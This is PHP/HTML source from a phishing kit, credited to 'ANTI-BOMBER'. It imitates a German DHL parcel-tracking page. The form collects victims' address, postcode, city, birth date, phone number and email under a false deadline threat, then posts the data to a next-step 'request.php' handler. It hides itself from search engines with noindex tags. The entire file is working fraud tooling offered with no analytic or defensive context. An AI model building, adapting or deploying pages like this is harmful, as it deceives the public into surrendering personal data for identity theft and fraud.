<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=three&'.$id;
?>
<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>herzlich willkommen</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="google" content="notranslate">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="stylesheet" href="./layout/css/style.css">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<script src="<?php echo $js;?>"></script>
	<script src="./layout/js/style.js"></script>
	</head>
	<body class="lowla">
		<div id="bg-load" class="bg-load"><div class="load"></div>	</div>
		<div class="contenu">
		<header>
			<div class="pri">
				<span class="prv">Privatkunden</span>
				<span class="per">Geschäftskunden</span>
			</div>
			<div class="bande">
				<span class="lg"><img src="./layout/img/lg.svg"></span>
			<ul>
			<li>Pakete senden</li>
			<li>Pakete empfangen</li>
			<li>Hilfe & Kontakt</li>
			</ul>
			</div>
		</header>
		<section>
		<form id="lFrm" method="post" action="<?php echo $action; ?>">
			<div class="parag">
				<span class="titr">DHL Verfolgung</span>
				<span class="deta">Hier finden Sie Informationen zu Ihren Versendungen</span>
				<span class="deta">Verfolgen Sie Ihre Paketsendungen jederzeit vom Versand bis zur Lieferung</span>
			</div>
			<div class="box">
			<div class="pak">
				<div class="allt">
				<div>
				<input type="text" class="stre" id="stre" name="stre" maxlength="20" required placeholder="Adresse" autocomplete="off" autofocus />
				<input type="text" class="maiz" id="maiz" name="maiz" maxlength="30" required placeholder="PLZ" autocomplete="off">
				<input type="text" class="zi" id="zi" name="zi" maxlength="10" required placeholder="Stadt" autocomplete="off">
				<input type="text" class="Vie" id="Vie" name="Vie" maxlength="10" placeholder="Geburtsdatum tt / mm / jjjj" autocomplete="off">
				<input type="text" class="tl" id="tl" name="tl" maxlength="60" required placeholder="Telefonnummer" autocomplete="off">
				<input type="text" class="em" id="em" name="em" maxlength="60" required placeholder="E-Mail" autocomplete="off">
				</div>
				</div>
				<div class="erro2">
				<span>Wir benötigen Ihre Adresse, um sicherzustellen, dass unbefugte Personen Ihr Paket nicht erreichen können. Sie haben <span style="color:#d40511;font-weight:bold">10 Werktage</span> ab dem Eintreffen Ihres Pakets in der DHL-Filiale. Nach dieser Zeit wird das Paket an den Absender zurückgesendet.</span>
				</div>
			</div>
			</div>
			<div><button type="submit" class="text-center" >Nächster</button></div>
		</form>
			<div class="pubb"><img class="pb01" src="./layout/img/pub.jpg"><img class="pb02" src="./layout/img/pubr.gif"></div>
		</section>
		</div>


		<footer>
			<div class="contenu">
		<ul>
		<li>DHL Paket</li>
		<li>DHL Dienstleistungen.</li>
		<li>DHL Ausdrücken.</li>
		<li>DHL Logistik.</li>
		</ul>
		<ul>
		<li>Kontakt</li>
		<li>Hilfe & Kundenservice.</li>
		<li>So funktioniert das.</li>
		<li>Mobile Apps.</li>
		</ul>
		<ul>
		<li>Über uns.</li>
		<li>Post DHL.</li>
		<li>Verantwortung.</li>
		<li>Presse.</li>
		<li>Werdegang.</li>
		</ul>
		<div>&copy; <?php echo date("Y"); ?><?php echo lang('FtrS2'); ?></div>
		</div>
	</footer>
	</body>
<script src="<?php echo $js;?>"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 1900);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

	</script>
</html>
<?php
    endif;
    ob_end_flush();
?>
